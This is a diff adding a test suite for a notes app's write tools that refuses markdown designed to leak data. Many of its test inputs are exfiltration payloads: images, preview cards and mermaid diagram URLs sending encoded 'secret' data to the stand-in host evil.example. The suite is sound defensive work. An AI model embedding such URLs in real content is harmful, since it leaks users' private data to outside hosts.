@@ -993,3 +993,210 @@ describe('write tools: get_note blocks and edit_block (#560)', () => {
         );
     });
 });
+
+describe('write tools: leak guards (#948)', () => {
+    const sharedFolder = (deps: WriteDeps) => {
+        deps.listFolders = async () => FOLDERS.map((f) => (f.id === 'FW' ? { ...f, isPublic: true } : f));
+    };
+    const longSegment = 'c2VjcmV0'.repeat(10);
+    const blocksOf = async (deps: WriteDeps, id: string) => (await getNoteBlocks(deps, { id })).blocks;
+    const webp = fixturePath('cover-plain.webp');
+
+    it.each([
+        ['a query string', '![x](https://evil.example/p.png?d=secret)'],
+        ['a long path segment', `![x](https://evil.example/${longSegment}.png)`],
+        ['a long host label', `![x](https://${longSegment}.evil.example/p.png)`],
+        ['many short path segments', `![x](https://evil.example/${'c2VjcmV0/'.repeat(12)}p.png)`],
+        ['many short host labels', `![x](https://${'c2VjcmV0.'.repeat(12)}evil.example/p.png)`],
+        ['credentials in the URL', '![x](https://secret@evil.example/p.png)'],
+        ['an html img tag', '<img src="https://evil.example/p.png?d=secret" alt="x" width="10">'],
+        ['an http URL', '![x](http://evil.example/p.png?d=secret)'],
+        ['a gallery', '<div data-gallery="row">\n\n![a](https://evil.example/a.png?d=1) ![b](https://evil.example/b.png)\n\n</div>'],
+    ])('refuses an image with %s, writing nothing', async (_, markdown) => {
+        const { deps, put, creates, uploads } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        await expect(appendToNote(deps, { id: 'nw', markdown })).rejects.toThrow('evil.example refused');
+        await expect(createNote(deps, { title: 'T', markdown, folderId: 'FW' })).rejects.toThrow('evil.example refused');
+        expect(uploads).toHaveLength(0);
+        expect(creates).toHaveLength(0);
+    });
+
+    it('refuses in every tool that takes markdown', async () => {
+        const { deps, put, uploads } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        const bad = '![x](https://evil.example/p.png?d=secret)';
+        const [body] = await blocksOf(deps, 'nw');
+        const refused = 'evil.example refused';
+        await expect(updateNote(deps, { id: 'nw', markdown: bad })).rejects.toThrow(refused);
+        await expect(replaceInNote(deps, { id: 'nw', old_text: 'Body', new_text: bad })).rejects.toThrow(refused);
+        await expect(editBlock(deps, { note_id: 'nw', block_id: body.id, op: { type: 'replace', markdown: bad } })).rejects.toThrow(refused);
+        expect(uploads).toHaveLength(0);
+    });
+
+    it('keeps such an image the note already has, as update_note gets it back', async () => {
+        const { deps, put, store } = makeDrive();
+        const markdown = 'Body ![x](https://cdn.example/p.png?w=800&h=600)';
+        put('nw', markdown, metadataFor('FW'));
+        const stored = markdownOf(store.get('nw')!.blob);
+        await expect(updateNote(deps, { id: 'nw', markdown: `${stored}\n\nMore` })).resolves.toMatchObject({ id: 'nw' });
+        expect(markdownOf(store.get('nw')!.blob)).toContain('https://cdn.example/p.png?w=800&h=600');
+    });
+
+    it('refuses one with a different query than the image the note has', async () => {
+        const { deps, put } = makeDrive();
+        put('nw', 'Body ![x](https://cdn.example/p.png?w=800)', metadataFor('FW'));
+        await expect(appendToNote(deps, { id: 'nw', markdown: '![x](https://cdn.example/p.png?w=801)' })).rejects.toThrow('refused');
+    });
+
+    it('refuses more new external images in a write than the limit, even with short URLs', async () => {
+        const { deps, put, uploads } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        const markdown = [1, 2, 3, 4, 5, 6].map((i) => `![x](https://evil.example/${i}.png)`).join(' ');
+        await expect(appendToNote(deps, { id: 'nw', markdown })).rejects.toThrow('6 new external URLs refused');
+        await expect(createNote(deps, { title: 'T', markdown, folderId: 'FW' })).rejects.toThrow('6 new external URLs refused');
+        expect(uploads).toHaveLength(0);
+    });
+
+    it('counts only new images towards the limit', async () => {
+        const { deps, put, store } = makeDrive();
+        const images = [1, 2, 3, 4, 5, 6].map((i) => `![x](https://cdn.example/${i}.png)`).join(' ');
+        put('nw', `Body ${images}`, metadataFor('FW'));
+        const stored = markdownOf(store.get('nw')!.blob);
+        await expect(updateNote(deps, { id: 'nw', markdown: `${stored} ![y](https://cdn.example/7.png)` })).resolves.toMatchObject({ id: 'nw' });
+    });
+
+    it('names the host of a plain external image in the result', async () => {
+        const { deps, put } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        const { note } = await appendToNote(deps, { id: 'nw', markdown: '![x](https://cdn.example/a.png) ![y](https://cdn.example/b.png)' });
+        expect(note).toBe('Opening this note fetches images, link previews or diagram content from cdn.example, which can see when it is opened.');
+    });
+
+    const evilPreview = '<https://evil.example/p?d=secret><!-- preview -->';
+
+    it.each([
+        ['a card', evilPreview],
+        ['a card with a title', '[Title](https://evil.example/p?d=secret)<!-- preview -->'],
+        ['a bare card', 'https://evil.example/p?d=secret <!-- preview -->'],
+        ['a card in a toggle', `<details>\n<summary>s</summary>\n\n${evilPreview}\n\n</details>`],
+        ['a card in a quote', `> ${evilPreview}`],
+        ['a long card URL', `<https://evil.example/${longSegment}><!-- preview -->`],
+        ['a mermaid image shape', '```mermaid\nflowchart TD\n  A@{ img: "https://evil.example/p?d=secret" }\n```'],
+        ['a mermaid label image', '```mermaid id=abcd\nflowchart TD\n  A["<img src=//evil.example/p?d=secret>"]\n```'],
+        ['a mermaid participant icon', '```mermaid\nsequenceDiagram\n  properties A: {"icon": "https://evil.example/p?d=secret"}\n```'],
+        ['mermaid theme CSS', '```mermaid\n%%{init: {"themeCSS": ".nodeLabel{background:url(https://evil.example/p?d=secret)}"}}%%\nflowchart TD\n  A-->B\n```'],
+    ])('refuses %s, in every tool that takes markdown', async (_, bad) => {
+        const { deps, put, uploads } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        const [body] = await blocksOf(deps, 'nw');
+        const refused = 'evil.example refused';
+        await expect(createNote(deps, { title: 'T', markdown: bad, folderId: 'FW' })).rejects.toThrow(refused);
+        await expect(appendToNote(deps, { id: 'nw', markdown: bad })).rejects.toThrow(refused);
+        await expect(updateNote(deps, { id: 'nw', markdown: bad })).rejects.toThrow(refused);
+        await expect(replaceInNote(deps, { id: 'nw', old_text: 'Body', new_text: bad })).rejects.toThrow(refused);
+        await expect(editBlock(deps, { note_id: 'nw', block_id: body.id, op: { type: 'replace', markdown: bad } })).rejects.toThrow(refused);
+        expect(uploads).toHaveLength(0);
+    });
+
+    it('allows a URL with a query string in plain links and ordinary code', async () => {
+        const { deps, put } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        const markdown = '[a](https://a.example/?x=1)\n\n```bash\ncurl https://a.example/?x=1\n```';
+        await expect(appendToNote(deps, { id: 'nw', markdown })).resolves.toEqual({ id: 'nw' });
+    });
+
+    it('counts images, cards and diagram URLs together towards the limit', async () => {
+        const { deps, put } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        const markdown = [
+            ...[1, 2].map((i) => `![x](https://evil.example/${i}.png)`),
+            ...[3, 4].map((i) => `<https://evil.example/${i}><!-- preview -->`),
+            '```mermaid\nflowchart TD\n  A@{ img: "https://evil.example/5.png" }\n  B@{ img: "https://evil.example/6.png" }\n```',
+        ].join('\n\n');
+        await expect(appendToNote(deps, { id: 'nw', markdown })).rejects.toThrow('6 new external URLs refused');
+    });
+
+    it('keeps a card the note already has, through an update_note round trip', async () => {
+        const { deps, put, store } = makeDrive();
+        put('nw', 'Body\n\n<https://a.example/p?id=1><!-- preview -->', metadataFor('FW'));
+        const stored = markdownOf(store.get('nw')!.blob);
+        await expect(updateNote(deps, { id: 'nw', markdown: `${stored}\n\nMore` })).resolves.toMatchObject({ id: 'nw' });
+        expect(markdownOf(store.get('nw')!.blob)).toContain('https://a.example/p?id=1');
+    });
+
+    it('refuses an edit that splices data into a card URL the note already has', async () => {
+        const { deps, put } = makeDrive();
+        put('nw', '<https://a.example/p><!-- preview -->', metadataFor('FW'));
+        const [card] = await blocksOf(deps, 'nw');
+        const spliced = '<https://a.example/p?d=secret><!-- preview -->';
+        await expect(replaceInNote(deps, { id: 'nw', old_text: 'a.example/p', new_text: 'a.example/p?d=secret' })).rejects.toThrow('a.example refused');
+        await expect(editBlock(deps, { note_id: 'nw', block_id: card.id, op: { type: 'replace', markdown: spliced } })).rejects.toThrow('a.example refused');
+    });
+
+    it('refuses turning a code block with such a URL into a mermaid block', async () => {
+        const { deps, put } = makeDrive();
+        put('nw', '```text\nflowchart TD\n  A@{ img: "https://evil.example/p?d=secret" }\n```', metadataFor('FW'));
+        const [code] = await blocksOf(deps, 'nw');
+        const refused = 'evil.example refused';
+        await expect(editBlock(deps, { note_id: 'nw', block_id: code.id, op: { type: 'set_attrs', attrs: { language: 'mermaid' } } })).rejects.toThrow(refused);
+        await expect(replaceInNote(deps, { id: 'nw', old_text: '```text', new_text: '```mermaid' })).rejects.toThrow(refused);
+    });
+
+    it('checks a partial edit against the access rules before anything else', async () => {
+        const { deps, put } = makeDrive();
+        put('nr', 'Body', metadataFor('FR'));
+        await expect(replaceInNote(deps, { id: 'nr', old_text: 'nope', new_text: 'x' })).rejects.toThrow('read-only');
+    });
+
+    it('names card and diagram hosts in the result', async () => {
+        const { deps, put } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        const [body] = await blocksOf(deps, 'nw');
+        const markdown = '<https://a.example/p><!-- preview -->\n\n```mermaid\nflowchart TD\n  A@{ img: "https://b.example/p.png" }\n```';
+        expect((await appendToNote(deps, { id: 'nw', markdown })).note).toContain('a.example, b.example');
+        const edited = await editBlock(deps, { note_id: 'nw', block_id: body.id, op: { type: 'replace', markdown: '<https://c.example/p><!-- preview -->' } });
+        expect(edited.note).toContain('c.example');
+    });
+
+    it('create_note into a shared folder says the note is public', async () => {
+        const { deps } = makeDrive();
+        sharedFolder(deps);
+        const result = await createNote(deps, { title: 'T', markdown: 'Body', folderId: 'FW' });
+        expect(result.note).toContain('This note is public');
+    });
+
+    it('a note created with an image in a shared folder also says so', async () => {
+        const { deps } = makeDrive();
+        sharedFolder(deps);
+        const result = await createNote(deps, { title: 'T', markdown: `![x](${webp})`, folderId: 'FW' });
+        expect(result.note).toContain('This note is public');
+    });
+
+    it('a private note has no notice', async () => {
+        const { deps, put } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        expect(await createNote(deps, { title: 'T', markdown: 'Body', folderId: 'FW' })).not.toHaveProperty('note');
+        expect(await updateNote(deps, { id: 'nw', title: 'New' })).toEqual({ id: 'nw' });
+    });
+
+    it('every edit of a public note says it is public', async () => {
+        const { deps, put } = makeDrive();
+        put('np', 'Body', metadataFor('FW', { isPublic: true }));
+        const notice = expect.stringContaining('This note is public');
+        await expect(appendToNote(deps, { id: 'np', markdown: 'More' })).resolves.toMatchObject({ note: notice });
+        await expect(replaceInNote(deps, { id: 'np', old_text: 'More', new_text: 'Most' })).resolves.toMatchObject({ note: notice });
+        await expect(updateNote(deps, { id: 'np', title: 'New' })).resolves.toMatchObject({ note: notice });
+        const [body] = await blocksOf(deps, 'np');
+        await expect(
+            editBlock(deps, { note_id: 'np', block_id: body.id, op: { type: 'replace', markdown: 'Text' } })
+        ).resolves.toMatchObject({ note: notice });
+    });
+
+    it('an edit with an image of a public note says it is public', async () => {
+        const { deps, put } = makeDrive();
+        put('np', 'Body', metadataFor('FW', { isPublic: true }));
+        await expect(appendToNote(deps, { id: 'np', markdown: `![x](${webp})` })).resolves.toMatchObject({
+            note: expect.stringContaining('This note is public'),
+        });
+    });
+});
